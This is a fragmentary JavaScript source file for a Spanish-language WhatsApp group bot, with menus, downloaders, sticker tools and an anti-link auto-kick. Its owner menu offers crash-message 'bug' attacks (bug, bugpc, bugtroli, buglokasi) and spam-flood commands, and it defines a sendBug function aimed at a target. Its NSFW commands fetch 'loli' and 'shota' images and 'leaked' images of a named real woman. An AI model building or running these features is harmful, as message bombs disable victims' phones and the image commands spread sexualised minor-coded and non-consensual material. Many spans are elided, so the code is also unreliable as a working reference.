...
try {
		...
		cmhit.push(command)
        mess = {
			wait: '\`\`\`⊷️「 Espera un momento ⏳ 」\`\`\`',
			success: '\`\`\`⊷️「 Hecho ✔️」\`\`\`',
			error: {
				stick: '\`\`\`⊷️「 No pudo convertir video! ❌」\`\`\`',
				Iv: '\`\`\`⊷️「 Link Invalido! ❌」\`\`\`',
                api: 'Error'
			},
			only: {
				group: '\`\`\`⊷️「 Este comando solo funciona en grupos❗」\`\`\`',
				ownerG: '\`\`\`⊷️「 Este comando es solo para dueños ❗」\`\`\`',
				ownerB: '\`\`\`⊷️「 Este comando es solo para el dueño del bot❗」\`\`\`',
				admin: '\`\`\`⊷️「 Este comando es solo para admins❗」\`\`\`',
				Badmin: '\`\`\`⊷️「 El bot necesita administrador❗ 」\`\`\`'
			}
		}
		...
		const katalog = (teks) => {
             res = denz.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_Hatori Hanzo_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
             denz.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = denz.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '51928564603-1625058716@g.us', "inviteCode": 'https://chat.whatsapp.com/J6RIrdUs7ql2w0uP3Zkuyy', "groupName": `${NamaBot}`, "footerText": "*_Hatori Hanzo_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
		...
		const sekarang = new Date().getTime();
			...
			var ase = new Date();
                        var jamss = ase.getHours();
                         switch(jamss){
                case 0: jamss = " buena madrugada 🌚"; break;
                case 1: jamss = " buenos dias🌚"; break;
                case 2: jamss = "Buenos dias🌚"; break;
                case 3: jamss = "Buenos dias 🌔"; break;
                case 4: jamss = "Buenos dias🌔"; break;
                case 5: jamss = "Buenos dias 🌄"; break;
                case 6: jamss = "Buenos dias 🌄"; break;
                case 7: jamss = "Buenos dias 🌄"; break;
                case 8: jamss = "Buenos dias ☀️"; break;
                case 9: jamss = "Buenos dias ☀️"; break;
                case 10: jamss = "Buenos dias ☀️"; break;
                case 11: jamss = "Buenos dias 🌞"; break;
                case 12: jamss = "Buenas tardes 🌞"; break;
                case 13: jamss = "Buenas tardes 🌞"; break;
                case 14: jamss = "Buenas tardes 🌞"; break;
                case 15: jamss = "Buenas tardes 🌞"; break;
                case 16: jamss = "Buenas tardes ☀️"; break;
                case 17: jamss = "Buenas tardes 🌄"; break;
                case 18: jamss = "Buenas tardes 🌄"; break;
            ...
            const jmn = moment.tz('America/Lima').format('HH:mm:ss')
				...
				const weton = ['Domingo', 'Lunes', 'Martes', 'Miercoles', 'Jueves', 'Viernes', 'Sabado'][Math.floor(((d * 1) + gmt) / 84600000) % 7]
...
const fvid = {
	 ...
	 { remoteJid: "51928564603-1625058716@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${tampilUcapan} ${pushname}`,
...
const finv = {
	...
	"message": {
		"groupInviteMessage": {
			"groupJid": "51928564603-1625058716@g.us",
...
const sendBug = async (target) => {
   ...
   /*.   const kick = function(from, persona){
	       for (let i of persona){
	       denz.groupRemove(from, [i])
        }
        }*/
///Button Text
...
denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 ...
 if (!mek.key.remoteJid.endsWith('@g.us') && offline){
			...
			if (!mek.key.fromMe){
				...
				for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
					if (ment === denz.user.jid){
                        ...
                        addafk(mek.key.remoteJid)
						heheh = ms(Date.now() - waktuafk)
			       sendButMessage(from, `Hola ${pushname}, el bot se a conectado correctamente a este numero ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© Dcode Denpa_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
				}
						}
					}
		...
		const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('America/Lima').format('HH:mm:ss'), "gold"), color('Downloading sticker'))
				...
				download(url, namea, async function () {
					...
					console.log(color(time, 'magenta'), color(moment.tz('America/Lima').format('HH:mm:ss'), "gold"), color('Succes send sticker'))
					});
					});
				});
			}
		...
		const reply = (teks) => {
			denz.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} - ${calender}`,body:"",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/380946910922?text=Hola%20mi%20estimado`}}})
		}
		const reply2 = (teks) => {
...
reply(String(e))
        ...
        if (isMuted){
            ...
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)){
                ...
                reply('Bot no desmuteado en este grupo')
            }
        }
        if (budy.includes("https://chat.whatsapp.com/")) {
        	if (!mek.key.fromMe){
				...
				if (isGroupAdmins) return reply('Eres un admin')
				denz.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Link detectado, Auto kick!')
			    denz.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("https://bit.ly/")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres un admin')
				denz.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Link bit detectado, Auto kick!')
			    denz.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("๙")) {
        	...
        	if (!mek.key.fromMe){
				...
				denz.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('trava detectada, Auto kick!')
			    denz.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("๒")) {
			...
			if (budy.includes("๗֨֨݉݉݉ٚٚٚٚٚٚٚٚٚ")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres un admin')
...
denz.updatePresence(from, Presence.recording)
   ...
   const sotoy = [
     ...
     case "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf":
        if (!isStcSticker) return reply('Responde el  sticker!')
...
fill =`Hola ${pushname}, ${tampilUcapan}
Seleccione para mostrar el Menu

Si no ve los botones, escriba .menu2`
menu =`HHBOT`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'📑MOSTRAR MENU'},type:1},
{buttonId:`command`,buttonText:{displayText:'🖥️MENU LISTA'},type:1}
]
...
gambar = await getBuffer(randKey.result)
   menu = `*Hola ${pushname}*
*Si el boton no esta alli*
*escriba #allmenu, o .menu2*
...
- Dia : ${week}
- Fecha : ${calender}`
sendButLocation(from, `${menu}`, "H a t o r i 👹", {jpegThumbnail:gambar,name:""}, [
{buttonId:`allmenu`,buttonText:{displayText:'📑MOSTRARMENU'},type:1},
...
/*Dueño : ${otod.split('@')[0]}*/
case 'allmenu':
denz.sendMessage(from, 'cargando menu..', text, {quoted: ftok})
stst = await denz.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			/*num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})*/
data = fs.readFileSync('./lib/logo.js');
...
├ ${prefix}bc [ _text/reply gif/image/video with caption_ ]
...
├ ${prefix}mute
├ ${prefix}unmute
├ ${prefix}mode [ _public/self_ ]
├ ${prefix}setmenu [ _1/2_ ]
├ ${prefix}spam [ _texto|cantidad_ ]
├ ${prefix}demoteall
├ ${prefix}promoteall
├ ${prefix}addcmd [ _texto reply stc_ ]
├ ${prefix}delcmd [ _reply stc_ ]
├ ${prefix}listcmd
├ ${prefix}spamsw [ _texto/cantidad_ ]
├ ${prefix}upswteks [ _texto_ ]
├ ${prefix}upswlokasi [ _texto_ ]
...
├ ${prefix}setbio [ _texto_ ]
├ ${prefix}bug [ _cantidad_ ]
├ ${prefix}bugpc2 [ _cantidad_ ]
├ ${prefix}bugtroli2 [ _cantidad_ ]
├ ${prefix}bugpc
├ ${prefix}bugcombine
├ ${prefix}bugtroli
├ ${prefix}buglokasi
...
├ ${prefix}addrespon [ _pregunta|respuesta_ ]
├ ${prefix}delrespon [ _nombre_ ]
...
├ ${prefix}ytsearch [ _name_ ]
├ ${prefix}ytmp4 [ _link yt_ ]
├ ${prefix}ytmp3 [ _link yt_ ]
├ ${prefix}play [ _name music_ ]
├ ${prefix}video [ _name video_ ]
├ ${prefix}facebook [ _link FB_ ]
├ ${prefix}twt [ _link twt_ ]
├ ${prefix}tinyurl [ _link_ ]
├ ${prefix}fetch [ _link_ ]
├ ${prefix}igdl [ _link IG_ ]
├ ${prefix}tiktokdl [ _link_ ]
├ ${prefix}pinterest [ _search_ ]
├ ${prefix}lirik [ _name_ ]
├ ${prefix}tourl [ _reply image/video_ ]
├ ${prefix}resepmasakan [ _name_ ]
├ ${prefix}artimimpi [ _texto_ ]
├ ${prefix}bilangangka [ _numero_ ]
├ ${prefix}kalkulator [ _numero_ ]
├ ${prefix}fancytext [ _texto_ ]
├ ${prefix}githubstalk [ _username_ ]
├ ${prefix}translate [ _code|text_ ]
├ ${prefix}ss [ _link_ ]
└─────────────────❒

╭─❒ MAKER
├ ${prefix}matrix [ _texto_ ]
...
├ ${prefix}googletxt [ _texto_ ]
├ ${prefix}spiderman [ _texto_ ]
├ ${prefix}express [ _texto_ ]
├ ${prefix}dance [ _texto_ ]
├ ${prefix}blackbird [ _texto_ ]
├ ${prefix}halloween [ _texto_ ]
├ ${prefix}vampire [ _texto_ ]
├ ${prefix}codetxt [ _texto_ ]
├ ${prefix}text3d [ _texto_ ]
└─────────────────❒
...
├ ${prefix}hacked [ _texto_ ]
├ ${prefix}setnamegc [ _texto_ ]
├ ${prefix}setdeskgc [ _texto_ ]
...
├ ${prefix}caripesan [ _texto/cantidad_ ]
└─────────────────❒
...
├ ${prefix}listvn
├ ${prefix}listgrup
├ ${prefix}addsticker [ _nombre_ ]
├ ${prefix}delsticker [ _nombre_ ]
├ ${prefix}addvn [ _nombre_ ]
├ ${prefix}delvn [ _nombre_ ]
├ ${prefix}addimage [ _nombre_ ]
├ ${prefix}delimage [ _nombre_ ]
└─────────────────❒
...
├ ${prefix}detikvn [ _reply audio caption_ ]
├ ${prefix}detikvideo [ _reply video caption_ ]
└─────────────────❒

╭─❒ TOOLS
├ ${prefix}sticker/s/stiker
├ ${prefix}stickerwm [ _name|author_ ]
├ ${prefix}takestick [ _name|author_ ]
...
├ ${prefix}tag [ _numero_ ]
├ ${prefix}tagme
├ ${prefix}tts [ _cod + txt_ ]
├ ${prefix}readmore [ _text1|text2_ ]
├ ${prefix}chat [ _nmr|text_ ]
├ ${prefix}fdeface [ _replyimg link|txt1|txt2_ ]
├ ${prefix}getcaption [ _reply message_ ]
├ ${prefix}pantun
├ ${prefix}tospam [ _reply audio/sticker/image|cantidad_ ]
├ ${prefix}sharelock [ _txt1|txt2_ ]
└─────────────────❒`
sendButLocation(from, `${menu}`, "H a t o r i 👹", {jpegThumbnail:gambar,name:""}, [{buttonId:`owner`,buttonText:{displayText:'👑DUEÑO'},type:1},{buttonId:`script`,buttonText:{displayText:'📒SCRIPT'},type:1}], {contextInfo: { mentionedJid: [otod]}})
break
case 'command':
case 'menu2':
 stod = `${sender}`
 listMsg = {
 buttonText: '𝕮𝖑𝖎𝖈𝖐 𝖆𝖖𝖚𝖎́ ⌕',
 footerText: ' 🇲​🇪​🇳​🇺​ 🎎 !',
 description: `Hola @${stod.split('@')[0]}, Escoge un menu`,
 sections: [
                     {
...
├ ${prefix}fancytext [ _texto_ ]
├ ${prefix}githubstalk [ _username_ ]
├ ${prefix}translate [ _codigo|text_ ]
└ ${prefix}ss [ _link_ ]`
katalog(menu)
break
case 'makermenu':
...
├ ${prefix}tag [ _numero_ ]
├ ${prefix}tagme
├ ${prefix}tts [ _cod+ text_ ]
├ ${prefix}readmore [ _text1|text2_ ]
├ ${prefix}chat [ _numero|text_ ]
├ ${prefix}listimage
├ ${prefix}liststicker
├ ${prefix}listvn
├ ${prefix}listgrup
...
├ ${prefix}pantun
├ ${prefix}tospam [ _reply audio/sticker/image|cantidad_ ]
├ ${prefix}sharelock [ _text1|text2_ ]
├ ${prefix}sticker
├ ${prefix}stickerwm [ _name/author_ ]
├ ${prefix}takestick [ _name/author_ ]
├ ${prefix}colong [ _reply sticker_ ]
...
break
case 'nsfwmenu':
let contentt = fs.readFileSync('./imagen/nsfw.jpg')
const mediaaa = await denz.prepareMessage(from, contentt, MessageType.image, { thumbnail:fs.readFileSync('./imagen/nsfw.jpg')})
          let bacotlu = mediaaa.message["ephemeralMessage"] ? mediaaa.message.ephemeralMessage : mediaaa     
menu = `❏ 「 \`\`\`MENU NSFW  2D +🔞\`\`\` 」
├───────────────────
├ ${prefix}lentes
├ ${prefix}ahegao
...
case 'meme':
 anu1 = ["https://meme-api.herokuapp.com/gimme/memesmexico"]
 porn = await fetchJson(`${anu1}`, { method: 'get'})
 buffer = await getBuffer(`${porn.url}`)
 twext = `${porn.title}`
gbutsan = [{buttonId:`meme`,buttonText:{displayText:'NEXT➡️'},type:1}]
mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: buffer})
const buttonMessagessss = {
imageMessage: mhan.message.imageMessage,
contentText: twext ,
footerText: 'Memes Mejichangos Random',
buttons: gbutsan,
headerType: 4
}
denz.sendMessage(from, buttonMessagessss, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: text, quoted: mek})
break
case 'wallpaper':
case 'wpc':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://megayaa.herokuapp.com/api/akaneko/wallpapers`)
					gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`wpc`, buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagewpc = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
headerType: 4
}
denz.sendMessage(from, buttonMessagewpc, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'wallpapercel':
case 'wcel':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://megayaa.herokuapp.com/api/akaneko/mobileWallpapers`)
                  gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`wcel`, buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagewcel = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagewcel, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'waifu2':
                   tamnel = fs.readFileSync('./denz.jpg')
                   autho2rr = ["https://megayaa.herokuapp.com/api/waifu"]
porn = await fetchJson(`${autho2rr}`, { method: 'get'})
buffer = await getBuffer(`${porn.result.image}`)
                    
                    te2xt = `*Nombre* : ${porn.result.name}\n` 
                    te2xt += `*Anime* : ${porn.result.anime}`
                  gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`waifu2`, buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagewaifu2 = {
imageMessage: mhan.message.imageMessage,
contentText: te2xt,
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagewaifu2, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
...
case 'doujin':
                   ...
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`doujin`, buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagedou = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagedou, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'fox':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://megayaa.herokuapp.com/api/akaneko/foxgirl`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`fox`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagefox = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagefox, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'panties':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://megayaa.herokuapp.com/api/akaneko/panties`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`panties`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagepan = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagepan, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'school':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://megayaa.herokuapp.com/api/akaneko/school`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`school`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagesch = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagesch, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'ntr':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://megayaa.herokuapp.com/api/akaneko/netorare`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`ntr`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagentr = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagentr, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'maid':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://megayaa.herokuapp.com/api/akaneko/maid`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`maid`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagemaid = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagemaid, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'feet':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://megayaa.herokuapp.com/api/akaneko/feet`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`feet`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagefeetx = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagefeetx, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'yuri':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://megayaa.herokuapp.com/api/akaneko/yuri`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`yuri`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessageyuri = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessageyuri, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'neko':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://megayaa.herokuapp.com/api/akaneko/neko`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`neko`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagefoox = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagefoox, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'waifu':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://kuontol-api.herokuapp.com/api/randomimage/waifu`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`waifu`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagewai = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagewai, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'husb':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://kuontol-api.herokuapp.com/api/randomimage/husbu`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`husb`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagehusb = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagehusb, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'loli':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://kuontol-api.herokuapp.com/api/randomimage/loli`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`loli`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagelox = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagelox, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'shota':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://kuontol-api.herokuapp.com/api/randomimage/shota`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`shota`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagesho = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagesho, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'milf':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://kuontol-api.herokuapp.com/api/randomimage/milf`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`milf`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagefoxxx = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagefoxxx, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'cosplay':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://kuontol-api.herokuapp.com/api/randomimage/cosplay`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`cosplay`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagecos = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagecos, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'neko2':
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://kuontol-api.herokuapp.com/api/randomimage/nekonime`)
                   gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`neko2`, buttonText:{displayText:'NEXT➡️'},type:1}]
				   mhan = await denz.prepareMessage(from, anu, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagenek = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagenek, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break
case 'txt2img':
     if (args.length < 1) return reply(`*Example :*\n${prefix}${command} HHBOT`)
					makell = args.join(" ")
                   tamnel = fs.readFileSync('./denz.jpg')
                   anu = await getBuffer(`https://megayaa.herokuapp.com/api/ttp?text=${makell}`)
                  denz.sendMessage(from, anu, image, {quoted: mek, caption: '' , thumbnail: tamnel})
                   break
case 'lesbian':
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply('modo nsfw no activado')
					authxoor = ["https://meme-api.herokuapp.com/gimme/lesbians"]
 porn = await fetchJson(`${authxoor}`, { method: 'get'})
buffer = await getBuffer(`${porn.url}`)
					txt = `${porn.title}`
					gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`lesbian`, buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagessssxxs = {
imageMessage: mhan.message.imageMessage,
contentText: txt,
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagessssxxs, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
case 'belle':
					...
					sendFileFromUrl(bdp, image, {quoted: mek, caption: `*Imagenes filtradas de Belle Delphine*`})
					break
case 'ass2':
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply('modo nsfw no activado')
					...
					porn = await fetchJson(`${nk}`, { method: 'get' })
					buffer = await getBuffer(`${porn.url}`)
					title = `${porn.title}`
					gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`ass2`, buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagesssxssx = {
imageMessage: mhan.message.imageMessage,
contentText: title,
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagesssxssx, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
